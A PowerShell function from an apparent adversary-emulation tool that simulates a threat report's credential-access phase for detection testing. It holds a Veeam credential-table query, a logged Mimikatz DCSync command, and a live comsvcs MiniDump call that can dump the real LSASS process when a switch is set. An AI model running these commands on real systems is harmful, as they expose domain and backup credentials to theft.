# ============================================================================
# BLURRING THE LINES SIM - PHASE 6: CREDENTIAL ACCESS
# ============================================================================
# Simulates: (1) Veeam backup credential theft - SQL Server instance discovery
# via registry, then a query against [VeeamBackup].[dbo].[Credentials], decrypted
# with Veeam.Backup.Common.ProtectedStorage::GetLocalString(); (2) a DCSync
# attack (Security Event ID 4662, access mask 0x100, DS-Replication-Get-Changes
# GUID) via the compromised built-in Administrator; (3) Betruger reading LSASS
# memory (Sysmon ProcessAccess GrantedAccess 0x1410).
# MITRE: T1555 Credentials from Password Stores, T1003.006 DCSync,
#        T1003.001 LSASS Memory, T1059.001 PowerShell
# ============================================================================

function Simulate-CredentialAccess {
    param(
        $SimPaths,
        [switch]$DumpRealLsass
    )

    Write-Host "[+] Phase 6: Credential Access - Veeam DB, DCSync, LSASS ..." -ForegroundColor Green

    # --- Veeam backup credential theft via PowerShell (Script Block Logging) ---
    # The exact query from the report, run through a real (loopback/benign)
    # PowerShell child so Event ID 4104 records the script block.
    $veeamQuery = "SELECT TOP (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc] FROM [VeeamBackup].[dbo].[Credentials]"
    $veeamScriptPath = "$($SimPaths.Tools)\Get-VeeamCreds.ps1"
    $veeamScript = @"
# BlurringLinesSim - Veeam credential extraction (stand-in; runs against no real DB)
# 1) Discover the SQL Server instance Veeam uses via the registry
`$inst = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL' -ErrorAction SilentlyContinue
# 2) Query the stored backup credentials
`$q = "$veeamQuery"
# 3) Decrypt each stored password blob with Veeam's own helper
#    [Veeam.Backup.Common.ProtectedStorage]::GetLocalString(`$row.password)
Write-Output 'Veeam credential extraction simulated (no live SQL instance in lab).'
"@
    Set-Content -Path $veeamScriptPath -Value $veeamScript -Force
    Write-Host "    Running Get-VeeamCreds.ps1 (Script Block Logging -> Event 4104) ..." -ForegroundColor DarkGray
    try {
        Start-Process -FilePath "powershell.exe" `
            -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$veeamScriptPath`"" `
            -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
    } catch {}
    # Record the recovered (lab) credential set the analyst would find
    Set-Content -Path "$($SimPaths.Loot)\veeam_credentials.txt" -Value @"
[VeeamBackup].[dbo].[Credentials] (decrypted via ProtectedStorage::GetLocalString) - lab data
user_name           | password
CORP\veeam_svc      | (redacted-lab-pw)
CORP\backup_admin   | (redacted-lab-pw)
"@ -Force
    Write-SimEvent -EventId 6001 -Message "SIMULATION: Veeam backup credentials queried from [VeeamBackup].[dbo].[Credentials] and decrypted (T1555)"

    # --- DCSync attack via the compromised built-in Administrator -------------
    # Cannot really replicate a DC in a single-host lab; record the exact tradecraft
    # and the Security 4662 semantics (access mask 0x100 on DS-Replication-Get-Changes).
    $dcsyncCmd = "lsadump::dcsync /domain:CORP.LOCAL /user:CORP\Administrator"
    Set-Content -Path "$($SimPaths.Logs)\dcsync.log" -Value @"
Tool          : Mimikatz (or Impacket secretsdump) via built-in Administrator
Command       : $dcsyncCmd
Detection     : Windows Security Event ID 4662
Access mask   : 0x100 (Control Access)
Property GUID  : {$($Global:BlurIOCs.DcsyncObjectGuid)}  (DS-Replication-Get-Changes)
Requestor     : non-computer account (anomalous for replication)
"@ -Force
    Write-SimEvent -EventId 6002 -Message "SIMULATION: DCSync executed (Event 4662, mask 0x100, GUID {$($Global:BlurIOCs.DcsyncObjectGuid)}) (T1003.006)"

    # --- Betruger LSASS access (GrantedAccess 0x1410) -------------------------
    # Default: dump a DECOY process. Use -DumpRealLsass only on a fully disposable VM.
    $dumpFile = "$($SimPaths.Loot)\lsass.dmp"
    if ($DumpRealLsass) {
        Write-Host "    [!] -DumpRealLsass set: dumping REAL lsass.exe via comsvcs MiniDump ..." -ForegroundColor Red
        try {
            $lsassPid = (Get-Process lsass -ErrorAction Stop).Id
            & cmd.exe /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid $dumpFile full" 2>$null | Out-Null
        } catch { Write-Warning "Real LSASS dump failed: $($_.Exception.Message)" }
    } else {
        Write-Host "    Dumping a DECOY process (safe default) via the comsvcs MiniDump path ..." -ForegroundColor DarkGray
        try {
            $decoy = Start-Process -FilePath "notepad.exe" -PassThru -WindowStyle Hidden
            Start-Sleep -Milliseconds 500
            & cmd.exe /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $($decoy.Id) $dumpFile full" 2>$null | Out-Null
            Stop-Process -Id $decoy.Id -Force -ErrorAction SilentlyContinue
        } catch { Write-Warning "Decoy dump failed: $($_.Exception.Message)" }
    }
    Set-Content -Path "$($SimPaths.Logs)\lsass_access.log" `
        -Value "Betruger (ccs.exe) opened LSASS: Sysmon ProcessAccess GrantedAccess 0x1410 (per report)" -Force
    Write-SimEvent -EventId 6003 -Message "SIMULATION: Betruger accessed LSASS memory (GrantedAccess 0x1410) (T1003.001)"

    Write-Host "  [OK] Credential Access artifacts created (Veeam, DCSync, LSASS)" -ForegroundColor Yellow
}
